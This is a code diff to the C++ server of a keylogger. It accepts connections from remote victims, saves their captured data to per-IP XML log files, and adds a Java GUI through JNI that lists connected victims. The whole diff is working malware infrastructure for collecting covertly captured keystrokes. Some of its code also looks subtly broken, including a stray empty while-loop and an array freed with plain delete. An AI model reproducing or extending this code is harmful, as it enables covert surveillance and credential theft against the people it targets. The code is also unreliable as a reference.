@@ -1,16 +1,74 @@
 #include <winsock2.h>
 #include <mswsock.h>
 #include "ServerInterProcess.h"
+#include "keyloggerinterface.h"
 #include <stdio.h>
+#include <stdlib.h>
 #include <thread>
 #include <mutex>
 #include <fcntl.h>
 #include <io.h>
-
+#include <jni.h>
 HANDLE mu;
 SOCKETLIST *head;
+JavaVM* jvm;
+JNIEnv* env;
+int ConnectionCount;
+JNICALL void setConsoleColorDefault()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x0f);
+}
+JNICALL void setConsoleColorCaptureInformationCB()
+{
+     HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x30);
+}
+JNICALL void setConsoleColorProcessInformation()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x2f);
+}
+JNICALL void setConsoleColorTitleInformation()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x4f);
+}
+JNICALL void setConsoleColorCaptureInformationKL()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x60);
+}
+
+
+ JNICALL jobjectArray getBuffer()
+  {
+    jclass cls = env->FindClass("keyloggerinterface/keylogdata");
+    jmethodID cid = env->GetMethodID(cls,"<init>", "(JLjava/lang/String;)V");
+    SOCKETLIST *sl_h,*sl_c ;
+    jobjectArray ret = env->NewObjectArray(ConnectionCount,cls,NULL);
+    WaitForSingleObject(mu,INFINITE);
+
+    if(head->target != NULL)
+    {
+        sl_h = sl_c= head;
+
+        for(int x=0; x< ConnectionCount; x++)
+        {
+            jlong ipadd = sl_c->IPADDR;
+            jstring str = env->NewStringUTF(const_cast<char*>(sl_c->name));
+
+            env->SetObjectArrayElement(ret,x,env->NewObject(cls,cid,ipadd,str));
+            sl_c =sl_c->nextTarget;
+        }
+        while ((sl_c) != sl_h);
+    }
+    ReleaseMutex(mu);
+      return ret;
+  }
 void Listener()
 {
+
     WSADATA WSA;
     SOCKET Listener;
     SOCKADDR_IN server, target;
@@ -51,7 +109,6 @@ void Listener()
     char* name;
     while(true)
     {
-        fprintf(stderr, "accepted\n\t\t[*]Listening: ");
         SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
         SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
@@ -62,9 +119,7 @@ void Listener()
         else
         {
 
-            fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
-            WaitForSingleObject(mu,INFINITE);
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
             name = static_cast<char*>(malloc(0x100));
             link->name = name;
@@ -76,12 +131,14 @@ void Listener()
             do
             {
                 GetSystemTime(&timestamp);
-                sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
+                sprintf(link->name,".\\logged\\%ld_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                                FILE_ATTRIBUTE_NORMAL,NULL);
+
             }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
+
             SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
              WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
@@ -93,8 +150,12 @@ void Listener()
                 each link contains a socket so the listener thread can read data off of the
                 socket.
             */
+            link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
+
+            WaitForSingleObject(mu,INFINITE);
             if((head->target)==0x00)
             {
+
                 *head=*link;
                 head->nextTarget=head;
             }
@@ -104,25 +165,24 @@ void Listener()
                 head->nextTarget=link;
             }
             ReleaseMutex(mu);
+            ConnectionCount++;
 
         }
 
     }
 
 }
+
 void Handler()
 {
-        unsigned int rcv;
         char* buffer = static_cast<char *>(malloc(0x1000));
         SOCKETLIST *link;
-        SOCKETLIST previousLink;
         while(1)
         {
 
             while(head==nullptr ||(head->target)== NULL )
                 Sleep(1);
             WaitForSingleObject(mu,INFINITE);
-
                 link=head;
             ReleaseMutex(mu);
             while((head->target)!=NULL)
@@ -135,33 +195,33 @@ void Handler()
                         WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                   strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                         SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
-
                 }
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
                     Sleep(1);
                     WSASetLastError(0x00);
                     link = (link->nextTarget);
+                    Sleep(1); //give up a millisecond to stop heavy disk right from crashing the program
                 }
                 else
                 {
                     SOCKETLIST temp = *(link->nextTarget);
+
+                   WaitForSingleObject(mu,INFINITE);
                    if( link->target == temp.target)
                     {
-                        WaitForSingleObject(mu,INFINITE);
                         head->target=0x00;
                         head->nextTarget=0x00;
-                        ReleaseMutex(mu);
                     }
                     else
                     {
-                      WaitForSingleObject(mu,INFINITE);
+
                       link->target = link->nextTarget->target;
                       link->nextTarget=link->nextTarget->nextTarget;
                       head = link;
-                      ReleaseMutex(mu);
                     }
-
+                    ReleaseMutex(mu);
+                    ConnectionCount--;
                 }
 
             }
@@ -172,6 +232,8 @@ void Handler()
 */
 int main()
 {
+
+    ConnectionCount=0;
 
     mu = CreateMutex(NULL,false,NULL);
 
@@ -185,13 +247,41 @@ int main()
     }
     std::thread thread2 (Handler);
     pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params);
-        if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
+    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
     {
         printf("[*] priority of data listener increased successfully!\n");
     }
     ReleaseMutex(mu);
+    Sleep(100);
+    JavaVMInitArgs args;
+    JavaVMOption *option = new JavaVMOption[1];
+    option[0].optionString= const_cast<char*>("-Djava.class.path=.\\KeyLoggerInterface\\build\\classes;");
+    args.version = JNI_VERSION_1_8;
+    args.nOptions = 1;
+    args.options = option;
+    args.ignoreUnrecognized = false;
+    jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
+    if (k != JNI_OK)
+    {
+
+        return -1;
+    }
+
+    jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
+    JNINativeMethod methods[] = {const_cast<char*>("getBuffer"), const_cast<char*>("()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;"), (void*)&getBuffer,
+                                const_cast<char*>("setConsoleColorDefault"), const_cast<char*>("()V"),(void*)&setConsoleColorDefault,
+                                const_cast<char*>("setConsoleColorCaptureInformationCB"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationCB,
+                                const_cast<char*>("setConsoleColorProcessInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorProcessInformation,
+                                const_cast<char*>("setConsoleColorTitleInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorTitleInformation,
+                                const_cast<char*>("setConsoleColorCaptureInformationKL"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationKL};
+
+    jmethodID Init = env->GetMethodID(cls,"<init>","()V");
+    jobject obj = env->NewObject(cls,Init);
+    env->RegisterNatives(cls,methods,6);
+    jmethodID Init_Gui = env->GetMethodID(cls,"Console","()V");
+    env->CallVoidMethod(obj,Init_Gui);
+    delete option;
     thread1.join();
-    exit(-1);
 
 
     return 0;
